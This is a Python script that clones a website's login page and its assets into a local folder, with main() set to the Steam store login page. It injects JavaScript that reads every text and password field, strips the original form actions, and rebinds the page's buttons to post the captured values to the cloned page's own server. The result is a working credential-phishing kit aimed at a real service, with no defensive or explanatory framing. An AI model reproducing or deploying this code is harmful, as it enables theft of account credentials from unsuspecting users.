from bs4 import BeautifulSoup
from requests import Session,get
from urllib.request import urlopen
import os
import re
from time import sleep

class Cloner:

    def __init__(self,site,basePath):
        self.basePath = basePath
        self.site = site
        self.baseSite = re.match("(https?://)?([^/]*)",site)[0] + "/"
        self.session = Session()

    def clone(self):
        html = self.download(self.site)
        html = self.linkGenerator(html)
        html = self.injectJS(html)
        self.saveHtml(html)

    """
    return file's data made from url
    """
    def download(self, url):
        return self.session.get(url).content

    # """
    # return file's data made from url
    # """
    # def download(self, url):
    #     return urlopen(url).read()

    """
    create file from data and type of url in path
    """
    def save(self, data, path):
        if not path.startswith('/'):
            path = '/' + path
        path = os.path.relpath(self.basePath + path)
        dirname = os.path.dirname(path)
        if not os.path.exists(dirname) and dirname!="":
            os.makedirs(dirname)

        with open(path, "wb") as file:
            file.write(data)       

    def saveHtml(self, data, path="/index.html"):
        with open(self.basePath + path, "w", encoding="utf-8") as file:
            file.write(data)

    """
    generate a path from url
    """
    def pathGenerator(self, url):
        path = re.match("(https?://)?/?([^?]*)([?].*)?",url)[2]
        return path
    
    """
    generate links from site, and make copies of them in local dir
    """
    def linkGenerator(self,html):
        soup = BeautifulSoup(html, "html.parser")
        links = soup.find_all("link")
        for link in links:
            if not link.get("href",None):
                continue
            url = link['href']
            dest = self.pathGenerator(url)

            if not url.startswith("http"):
                base = True
                url = self.baseSite + url
            else:
                base = False
            data = self.download(url)
            # print(f'link:{link}\n dest={dest}')
            try:
                self.save(data,dest)
                link["href"] = dest if not base else "/"+dest
            except: 
                print(f"failed at saving data from url:{url} at {dest}")

        items = soup.find_all(src=True)
        for item in items:
            if not item.get("src",None): 
                continue
            url = item['src']
            dest = self.pathGenerator(url)

            if not url.startswith("http"):
                base = True
                url = self.baseSite + url
            else:
                base = False
            data = self.download(url)
            # print(f'script:{script}\n dest={dest}')
            try:
                self.save(data,dest)
                item["src"] = dest if not base else "/"+dest
            except:
                print(f"failed at saving data from url:{url} at {dest}")
        return str(soup)

    def injectJS(self,html):
        soup = BeautifulSoup(html, "html.parser")
                
        js = """
            function ___location() {
              return window.location.href.match(/^(.*\/\/.*?)(\/.*?)$/)[1];
            }

            function ___post(path, params) {
                // The rest of this code assumes you are not using a library.
                // It can be made less wordy if you use one.
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = path;

                for (const key in params) {
                    if (params.hasOwnProperty(key)) {
                        const hiddenField = document.createElement('input');
                        hiddenField.type = 'hidden';
                        hiddenField.name = key;
                        hiddenField.value = params[key];

                        form.appendChild(hiddenField);
                    }
                }
                document.body.appendChild(form);
                form.submit();
            }

            function ___getData() {
              let inputs = document.getElementsByTagName("input")
              let data = {}
              let state = 0;
              let gen = () => { state+=1; return state;}
              for(let inp of inputs) {
                if(inp.type == "text" || inp.type == "password") {
                  let name = inp.hasAttribute("name") ? inp.getAttribute("name") : 
                    inp.hasAttribute("formcontrolname") ? inp.getAttribute("formcontrolname") : 
                    inp.hasAttribute("id") ? inp.getAttribute("id") : "field_#" + gen();
                    if(!inp.value) continue;
                  data[name] = inp.value;
                }
              }
              return data
            }

            function ___send() {
                ___post(___location(),___getData());
            }

            window.addEventListener("load",()=>{
              let forms = document.getElementsByTagName("form");
              for(let form of forms) {
                form.removeAttribute("method");
                form.removeAttribute("action");
              }
              let buttons = document.getElementsByTagName("button");
              for(let button of buttons) {
                button.removeAttribute("type");
                button.setAttribute("onclick","___send()")
              }
            })
        """
        tag = soup.new_tag("script")
        tag.insert(1,js)
        soup.body.append(tag)
        return str(soup)

def main():
    site = "https://store.steampowered.com/login/"
    cloner = Cloner(site,"steam")
    cloner.clone()

if __name__=="__main__":
    main()
